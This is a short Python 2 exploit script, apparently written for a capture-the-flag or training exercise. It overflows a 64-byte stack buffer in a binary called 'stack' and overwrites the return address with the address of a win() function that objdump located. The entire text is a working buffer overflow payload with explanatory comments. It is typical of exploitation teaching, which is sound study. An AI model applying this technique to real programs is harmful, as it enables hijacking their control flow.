#!/usr/bin/python

# usage: ./stack <<< `./stack.py`

# we need to overflow the buffer into fp
# to call win()

# we find the address of win() with objdump
#      $ objdump -t stack | grep win
#
#      0000000000400584 g F .text 0000000000000010 win
#
# padding for the buf and win address
pad = 'A'*64
test = 'B'*4 + 'C'*4 #+ 'D' * 4
# endianness
winAddr = '\x84\x05\x40\x00'

print pad + test + winAddr
